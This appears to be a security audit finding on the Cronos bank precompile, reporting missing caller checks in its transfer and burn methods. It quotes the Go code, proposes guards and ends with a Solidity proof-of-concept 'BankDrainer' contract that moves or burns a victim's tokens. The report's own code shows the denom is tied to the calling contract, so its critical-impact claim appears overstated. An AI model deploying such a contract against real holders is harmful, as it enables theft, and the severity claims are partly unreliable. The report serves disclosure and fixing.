### Title
Unauthorized Transfer and Burn of `evm/` Denom Tokens via Unauthenticated `sender` Parameter in Bank Precompile - (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `BankContract` precompile's `transfer` and `burn` methods accept the token-holder address as a caller-supplied argument without verifying it matches `contract.Caller()`. Any EVM contract can therefore drain or destroy `evm/<contract>` denom tokens held by any victim address.

---

### Finding Description

`BankContract.Run` handles three methods: `mint`, `burn`, and `transfer`. For `burn`, the address to debit is taken directly from `args[0]`:

```go
recipient := args[0].(common.Address)
...
addr := sdk.AccAddress(recipient.Bytes())
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
```

For `transfer`, the source address is taken from `args[0]`:

```go
sender := args[0].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

In neither case is there any check that `contract.Caller() == sender/addr`. The denom is `EVMDenom(contract.Caller())` — i.e., `evm/<calling_contract_address>` — so the calling contract controls the denom namespace, but it can freely move tokens of that denom out of **any** account that holds them.

This is the direct Cronos analog of the external report's bug class: the authorization identity used to gate a privileged operation (`sender`/`addr` parameter) is not the actual transaction originator (`contract.Caller()`), creating a permission bypass. [1](#0-0) [2](#0-1) 

---

### Impact Explanation

**Critical — Unauthorized burn and transfer of `evm/` denom assets.**

`evm/<addr>` tokens are first-class Cosmos bank module coins. They can be:
- Mapped to CRC20/CRC21 tokens via `RegisterOrUpdateTokenMapping` and used in the IBC bridge.
- Held by users who received them through the `mint` path of the same precompile.

An attacker who controls a contract can call `transfer(victim, attacker, amount)` or `burn(victim, amount)` to move or destroy the victim's balance of `evm/<attacker_contract>` tokens with no approval from the victim. If those tokens are mapped to a native denom or IBC voucher, the attacker can drain the victim's bridged assets. [3](#0-2) [4](#0-3) 

---

### Likelihood Explanation

Any unprivileged EVM user can deploy a contract and call the bank precompile directly. No special role, key, or governance action is required. The only precondition is that the victim holds tokens of the attacker's denom, which the attacker can arrange by first calling `mint` to distribute tokens to victims (e.g., as part of a token airdrop or DeFi pool). [5](#0-4) 

---

### Recommendation

For `burn`: verify `contract.Caller() == recipient` before debiting.
For `transfer`: verify `contract.Caller() == sender` before calling `SendCoins`, or require an explicit on-chain allowance mechanism analogous to ERC-20 `approve`/`transferFrom`.

```go
// burn guard
if contract.Caller() != recipient {
    return nil, errors.New("caller is not the token holder")
}

// transfer guard
if contract.Caller() != sender {
    return nil, errors.New("caller is not authorized to transfer on behalf of sender")
}
``` [6](#0-5) [7](#0-6) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function burn(address addr, uint256 amount) external returns (bool);
}

contract BankDrainer {
    IBankPrecompile constant BANK = IBankPrecompile(address(100)); // 0x64

    // Step 1: attacker mints evm/<this> tokens to victim (e.g., as an airdrop)
    function seedVictim(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
    }

    // Step 2: attacker drains victim's evm/<this> tokens — no victim approval needed
    function drain(address victim, address attacker, uint256 amount) external {
        BANK.transfer(victim, attacker, amount);
    }

    // Alternative: burn victim's tokens
    function burnVictim(address victim, uint256 amount) external {
        BANK.burn(victim, amount);
    }
}
```

1. Deploy `BankDrainer`.
2. Call `seedVictim(victim, 1000)` — victim now holds 1000 `evm/<BankDrainer>` tokens.
3. Call `drain(victim, attacker, 1000)` — victim's balance is transferred to attacker with no consent.

The bank precompile executes `SendCoins(victim → attacker)` without any authorization check on `victim`. [2](#0-1) [8](#0-7)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L103-112)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-155)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
